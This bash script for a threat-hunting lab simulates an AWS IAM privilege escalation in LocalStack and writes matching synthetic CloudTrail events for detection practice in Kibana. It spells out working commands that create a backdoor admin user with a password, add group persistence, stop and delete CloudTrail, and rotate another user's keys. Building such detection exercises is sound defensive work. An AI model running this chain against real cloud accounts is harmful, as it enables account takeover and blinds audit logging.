#!/usr/bin/env bash
# run_iam_privesc.sh
# Interactive IAM privilege escalation simulation for Hunt Lab.
# ATT&CK: T1087.004, T1078.004, T1136.003, T1562.001
#
# Run on cloud-sim: vagrant ssh cloud-sim -c "sudo bash /vagrant/scripts/scenarios/run_iam_privesc.sh"

set -euo pipefail

EXPORT_DIR="/var/log/localstack/cloudtrail"
ATTACKER_IP="203.0.113.45"  # Simulated attacker (TEST-NET-3)
ACCT="000000000000"
REGION="us-east-1"
BACKDOOR_USER="svc-backup-restore"

log()  { echo "[iam-privesc] $*"; }

uuid() { python3 -c "import uuid; print(str(uuid.uuid4()))"; }

write_ct_event() {
  local ename="$1" esrc="$2" uname="$3" ronly="$4"
  local rparams="${5:-null}"
  local eid; eid=$(uuid)
  local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  mkdir -p "${EXPORT_DIR}"
  python3 - <<EOF
import json
obj = {
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "arn": "arn:aws:iam::${ACCT}:user/${uname}",
    "accountId": "${ACCT}", "userName": "${uname}"
  },
  "eventTime": "${ts}", "@timestamp": "${ts}",
  "eventSource": "${esrc}", "eventName": "${ename}",
  "awsRegion": "${REGION}", "sourceIPAddress": "${ATTACKER_IP}",
  "userAgent": "aws-cli/2.15.0 Python/3.11.6",
  "requestParameters": json.loads('${rparams}'), "responseElements": None,
  "requestID": "req-${eid}", "eventID": "${eid}",
  "readOnly": json.loads('${ronly}'), "eventType": "AwsApiCall",
  "managementEvent": True, "recipientAccountId": "${ACCT}"
}
with open("${EXPORT_DIR}/${eid}.json", "w") as f:
    json.dump(obj, f)
print("  [cloudtrail] ${ename} (user=${uname})")
EOF
}

cat <<BANNER
=============================================================
  Hunt Lab — IAM Privilege Escalation Scenario
  ATT&CK: T1087.004, T1078.004, T1136.003, T1562.001
  Attacker IP: ${ATTACKER_IP}
  Backdoor user: ${BACKDOOR_USER}
=============================================================
BANNER

# Phase 1: Reconnaissance (as analyst-readonly from attacker IP)
log "Phase 1: Account discovery..."
awslocal iam list-users &>/dev/null || true
write_ct_event "GetCallerIdentity"         "sts.amazonaws.com" "analyst-readonly" "true"
write_ct_event "ListUsers"                 "iam.amazonaws.com" "analyst-readonly" "true"
write_ct_event "ListAttachedUserPolicies"  "iam.amazonaws.com" "analyst-readonly" "true" \
  '{"userName":"analyst-readonly"}'
write_ct_event "ListAttachedUserPolicies"  "iam.amazonaws.com" "analyst-readonly" "true" \
  '{"userName":"dev-ops"}'
write_ct_event "ListPolicies"              "iam.amazonaws.com" "analyst-readonly" "true" \
  '{"scope":"All"}'
write_ct_event "GetPolicy"                 "iam.amazonaws.com" "analyst-readonly" "true" \
  '{"policyArn":"arn:aws:iam::aws:policy/IAMFullAccess"}'
write_ct_event "ListRoles"                 "iam.amazonaws.com" "analyst-readonly" "true"
sleep 2

# Phase 2: Privilege escalation using dev-ops IAMFullAccess
log "Phase 2: Creating backdoor admin user..."
awslocal iam create-user --user-name "${BACKDOOR_USER}" &>/dev/null || true
write_ct_event "CreateUser" "iam.amazonaws.com" "dev-ops" "false" \
  "{\"userName\":\"${BACKDOOR_USER}\"}"

awslocal iam create-access-key --user-name "${BACKDOOR_USER}" &>/dev/null || true
write_ct_event "CreateAccessKey" "iam.amazonaws.com" "dev-ops" "false" \
  "{\"userName\":\"${BACKDOOR_USER}\"}"

awslocal iam attach-user-policy \
  --user-name "${BACKDOOR_USER}" \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess &>/dev/null || true
write_ct_event "AttachUserPolicy" "iam.amazonaws.com" "dev-ops" "false" \
  "{\"userName\":\"${BACKDOOR_USER}\",\"policyArn\":\"arn:aws:iam::aws:policy/AdministratorAccess\"}"

awslocal iam create-login-profile --user-name "${BACKDOOR_USER}" \
  --password "Hunt1abS3cur3!" --no-password-reset-required &>/dev/null || true
write_ct_event "CreateLoginProfile" "iam.amazonaws.com" "dev-ops" "false" \
  "{\"userName\":\"${BACKDOOR_USER}\",\"passwordResetRequired\":false}"
sleep 2

# Phase 3: Verify escalation + persistence (as backdoor user)
log "Phase 3: Verifying escalation and establishing persistence..."
write_ct_event "GetCallerIdentity" "sts.amazonaws.com" "${BACKDOOR_USER}" "true"

awslocal iam create-group --group-name cloud-admins-backup &>/dev/null || true
write_ct_event "CreateGroup" "iam.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"groupName":"cloud-admins-backup"}'

awslocal iam add-user-to-group \
  --group-name cloud-admins-backup \
  --user-name "${BACKDOOR_USER}" &>/dev/null || true
write_ct_event "AddUserToGroup" "iam.amazonaws.com" "${BACKDOOR_USER}" "false" \
  "{\"groupName\":\"cloud-admins-backup\",\"userName\":\"${BACKDOOR_USER}\"}"

write_ct_event "AttachGroupPolicy" "iam.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"groupName":"cloud-admins-backup","policyArn":"arn:aws:iam::aws:policy/AdministratorAccess"}'

# Phase 4: Impair defenses — disable CloudTrail (T1562.001)
log "Phase 4: Disabling CloudTrail monitoring..."
awslocal cloudtrail stop-logging --name hunt-lab-trail &>/dev/null || true
write_ct_event "StopLogging"  "cloudtrail.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"name":"hunt-lab-trail"}'
write_ct_event "PutEventSelectors" "cloudtrail.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"trailName":"hunt-lab-trail","eventSelectors":[{"readWriteType":"None","includeManagementEvents":false}]}'
awslocal cloudtrail delete-trail --name hunt-lab-trail &>/dev/null || true
write_ct_event "DeleteTrail" "cloudtrail.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"name":"hunt-lab-trail"}'
sleep 2

# Phase 5: Lateral movement — rotate original user keys
log "Phase 5: Rotating analyst-readonly credentials..."
awslocal iam list-access-keys --user-name analyst-readonly &>/dev/null || true
write_ct_event "ListAccessKeys"  "iam.amazonaws.com" "${BACKDOOR_USER}" "true" \
  '{"userName":"analyst-readonly"}'
write_ct_event "UpdateAccessKey" "iam.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"userName":"analyst-readonly","accessKeyId":"AKIAEXAMPLEANALYST1","status":"Inactive"}'
write_ct_event "CreateAccessKey" "iam.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"userName":"analyst-readonly"}'
write_ct_event "TagUser" "iam.amazonaws.com" "${BACKDOOR_USER}" "false" \
  '{"userName":"svc-backup-restore","tags":[{"key":"ManagedBy","value":"terraform"}]}'

# Re-enable trail so the lab keeps working
awslocal cloudtrail create-trail --name hunt-lab-trail \
  --s3-bucket-name cloudtrail-logs &>/dev/null || true
awslocal cloudtrail start-logging --name hunt-lab-trail &>/dev/null || true

log "Scenario complete. Events written to ${EXPORT_DIR}"
echo ""
echo "  Hunt in Kibana: http://192.168.56.10:5601"
echo "  Index: cloudtrail-*  |  Filter: sourceIPAddress: ${ATTACKER_IP}"
echo "  Key events: CreateUser, AttachUserPolicy, DeleteTrail"
echo "  ATT&CK techniques: T1087.004, T1078.004, T1136.003, T1562.001"
